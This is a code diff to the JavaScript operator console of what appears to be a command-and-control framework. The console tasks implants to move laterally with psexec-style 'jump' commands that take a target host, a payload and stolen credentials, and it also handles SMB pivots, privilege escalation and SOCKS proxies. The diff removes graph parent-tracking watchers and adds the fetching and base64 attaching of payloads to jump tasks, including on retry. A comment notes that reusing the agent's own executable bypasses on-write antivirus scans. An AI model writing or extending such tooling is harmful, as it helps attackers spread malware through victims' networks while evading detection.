@@ -3963,12 +3963,6 @@ async function runCtxAction(act) {
             openConsoleFor(aid);
           }
           cmdLine = `jump ${method} ${vals.host} ${payloadName} ${vals.user} ${vals.pass}`;
-          // Register lateral watcher so new agent gets parent_id in graph
-          _lateralWatchers[vals.host] = {
-            parentID: aid,
-            knownIds: new Set(agents.map(a => a.id)),
-            expiry:   Date.now() + 300000,
-          };
         }
         setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
       });
@@ -4083,14 +4077,7 @@ async function runCtxAction(act) {
           addConsoleOutputForAgent(aid, pipeResult.output, '', null);
         }
 
-        // Step 3: register lateral watcher so the new child auto-gets parent_id
-        _lateralWatchers[vals.host] = {
-          parentID: aid,
-          knownIds: new Set(agents.map(a => a.id)),
-          expiry: Date.now() + 300000,
-        };
-
-        // Step 4: deploy payload to target via chosen staging method
+        // Deploy payload to target via chosen staging method
         const method  = vals.method || 'psexec';
         const cmdLine = `jump ${method} ${vals.host} ${effectiveOutName} ${vals.user} ${vals.pass}`;
         addConsoleOutputForAgent(aid, `[smb-pivot] Deploying → ${vals.host} via ${method}…`, '', null);
@@ -4254,13 +4241,6 @@ async function runCtxAction(act) {
           } else {
             openConsoleFor(aid);
           }
-
-          // Register watcher so spawned agent inherits parent_id in graph
-          _lateralWatchers[host] = {
-            parentID: aid,
-            knownIds: new Set(agents.map(a => a.id)),
-            expiry:   Date.now() + 300000,
-          };
 
           const cmdLine = `jump ${vals.method} ${host} ${payloadName} ${vals.user} ${vals.pass}`;
           addConsoleOutputForAgent(aid, `[privesc] → ${cmdLine}`, '', null);
@@ -6012,7 +5992,7 @@ function renderAgentTree() {
   const childrenOf={}, orphans=[];
   // SMB pivot children
   pivots.forEach(p=>{
-    const par=direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname) || null;
+    const par=p.parent_id ? direct.find(d=>d.id===p.parent_id) || null : null;
     p._par=par;
     if(par)(childrenOf[par.id]=childrenOf[par.id]||[]).push(p);
     else orphans.push(p);
@@ -6170,7 +6150,7 @@ function renderAgentCS() {
 
   const childrenOf={};
   pivots.forEach(p=>{
-    p._par=direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname) || null;
+    p._par=p.parent_id ? direct.find(d=>d.id===p.parent_id) || null : null;
     const pid=p._par?p._par.id:'__c2__';
     (childrenOf[pid]=childrenOf[pid]||[]).push(p);
   });
@@ -7019,7 +6999,7 @@ function renderAgentNetwork() {
   direct.forEach(a=>directByIdNet[a.id]=a);
   const childrenOf = {};
   pivots.forEach(p => {
-    const par = direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname);
+    const par = p.parent_id ? direct.find(d=>d.id===p.parent_id) || null : null;
     const pid = par ? par.id : '__c2__';
     (childrenOf[pid] = childrenOf[pid]||[]).push(p);
   });
@@ -7048,7 +7028,7 @@ function renderAgentNetwork() {
     _netEdges.push({s:src, t:a.id, col:edgeColor(a.transport, agentStatus(a).color==='gray'), dead:agentStatus(a).color==='gray'});
   });
   pivots.forEach(p => {
-    const par = direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname);
+    const par = p.parent_id ? direct.find(d=>d.id===p.parent_id) || null : null;
     _netEdges.push({s:par?par.id:'__c2__', t:p.id, col:edgeColor(p.transport,agentStatus(p).color==='gray'), dead:agentStatus(p).color==='gray'});
   });
 
@@ -7166,27 +7146,6 @@ async function refreshAgents() {
       if (pendingKillIds.has(a.id)) {
         if (!a.active) pendingKillIds.delete(a.id); // server confirmed dead — remove from set
         else a.active = false; // still alive on server — override locally
-      }
-    }
-    // Auto-assign parent_id for agents spawned via lateral movement
-    for (const [host, w] of Object.entries(_lateralWatchers)) {
-      if (Date.now() > w.expiry) { delete _lateralWatchers[host]; continue; }
-      for (const a of agents) {
-        const matchIP   = a.ip === host;
-        const matchHost = a.hostname?.toLowerCase() === host.toLowerCase();
-        if ((matchIP || matchHost) && !w.knownIds.has(a.id) && !a.parent_id) {
-          api('POST', `/api/agents/${a.id}/parent`, {parent_id: w.parentID}).then(pr => {
-            if (pr.ok) {
-              a.parent_id = w.parentID;
-              renderAgents();
-              if (agentView === 'graph') renderAgentGraph();
-              addConsoleOutputForAgent(w.parentID,
-                `[+] lateral child ${a.id.substring(0,8)} (${a.hostname}) → parent set in graph`, '', null);
-            }
-          });
-          delete _lateralWatchers[host];
-          break;
-        }
       }
     }
     renderAgents();
@@ -10718,6 +10677,17 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       taskType = localStorage.getItem('jumpType_' + agentID) || 'JUMP';
       // "self" payload: agent reuses its own exe on disk — no new file write, bypasses on-write AV scan
       const jumpPayload = lp[2] || '';
+      if (jumpPayload && !/^self$/i.test(jumpPayload)) {
+        addConsoleOutput(`[*] Fetching ${jumpPayload}…`, '', null);
+        try {
+          const jumpBytes = await fetchSCFile(jumpPayload);
+          payload = u8ToB64(jumpBytes);
+          addConsoleOutput(`[+] ${jumpPayload}: ${jumpBytes.length} bytes attached`, '', null);
+        } catch (e) {
+          addConsoleOutput('', `jump payload error: ${e.message}`, null);
+          return;
+        }
+      }
       const jumpObj = {
         method:  lMethod,
         host:    lp[1],
@@ -10726,12 +10696,6 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         pass:    lp.slice(4).join(' ') || '',
       };
       taskArgs = JSON.stringify(jumpObj);
-      // Register watcher so spawned agent auto-gets parent_id (lateral move or local privesc)
-      _lateralWatchers[lp[1]] = {
-        parentID: agentID,
-        knownIds: new Set(agents.map(a => a.id)),
-        expiry:   Date.now() + 300000,
-      };
       break;
     }
 
@@ -11291,7 +11255,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     if (tid) {
       // Register jump tasks for auto-retry on "unknown task type" errors
       if (taskType === 'JUMP' || taskType === 'LATERAL') {
-        _jumpTaskMap[tid] = {agentID, type: taskType, args: taskArgs};
+        _jumpTaskMap[tid] = {agentID, type: taskType, args: taskArgs, payload};
       }
       pollResult(tid, agentID);
     }
@@ -11301,10 +11265,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
 }
 
 let pollTimers = {};
-// Map taskID → {agentID, type, args} for jump auto-retry
+// Map taskID → {agentID, type, args, payload} for jump auto-retry
 const _jumpTaskMap = {};
-// Map targetHost → {parentID, knownIds, expiry} — auto-assign parent_id when new agent arrives
-const _lateralWatchers = {};
 function pollResultForAgent(agentID, taskID) {
   pollResult(taskID, agentID);
 }
@@ -11380,7 +11342,9 @@ async function pollResult(taskID, agentID) {
           const retry = err.includes('unknown task type: JUMP') ? 'LATERAL' : 'JUMP';
           localStorage.setItem('jumpType_' + aid, retry);
           addConsoleOutputForAgent(aid, `[~] auto-retry with ${retry}...`, '', null);
-          const r2 = await api('POST', `/api/agents/${aid}/task`, {type: retry, args: orig.args});
+          const r2 = await api('POST', `/api/agents/${aid}/task`, {
+            type: retry, args: orig.args, payload: orig.payload || ''
+          });
           // Do NOT register r2 in _jumpTaskMap — one retry only, no infinite loop
           if (r2.ok && r2.data?.task_id) pollResult(r2.data.task_id, aid);
           delete _jumpTaskMap[taskID];
@@ -11428,19 +11392,6 @@ async function pollResult(taskID, agentID) {
           const m = out.match(/:(\d+)/); if (m) agentSocksPort[aid] = parseInt(m[1]);
         } else if (out.includes('SOCKS5 stopped') || out.includes('SOCKS stopped')) {
           delete agentSocksPort[aid];
-        }
-        // After a successful lateral move, watch target host for a new child agent
-        if (orig && !err && out.includes('[+]')) {
-          try {
-            const la = JSON.parse(orig.args);
-            if (la.host) {
-              _lateralWatchers[la.host] = {
-                parentID: aid,
-                knownIds: new Set(agents.map(a => a.id)),
-                expiry:   Date.now() + 180000,
-              };
-            }
-          } catch(_) {}
         }
         if (orig) delete _jumpTaskMap[taskID];
         delete pollTimers[key];
